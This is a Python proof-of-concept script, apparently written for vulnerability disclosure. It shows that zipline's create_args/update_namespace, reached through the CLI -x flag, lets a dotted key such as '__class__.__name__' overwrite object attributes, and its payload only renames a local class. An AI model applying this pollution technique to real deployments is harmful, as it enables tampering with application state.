# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: create_args -> update_namespace (via CLI -x flag)
# Type: get-attr-set-attr
# Trigger: zipline run -x __class__.__name__=pwnd
#
# zipline's CLI accepts extension arguments via -x flags.
# These are parsed by create_args which splits on "." and
# recursively calls update_namespace with getattr/setattr traversal.

import sys
import types

# Mock six
six_mock = types.ModuleType('six')
six_mock.string_types = (str,)
sys.modules['six'] = six_mock

from zipline.extensions import create_args

class Target: pass
target = Target()

payload_value = "pwnd"

def run_poc():
  # Simulates: zipline run -x __class__.__name__=pwnd
  # create_args parses key=value args, splits key on ".", calls update_namespace
  cli_args = ["__class__.__name__=" + payload_value]
  create_args(cli_args, target)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
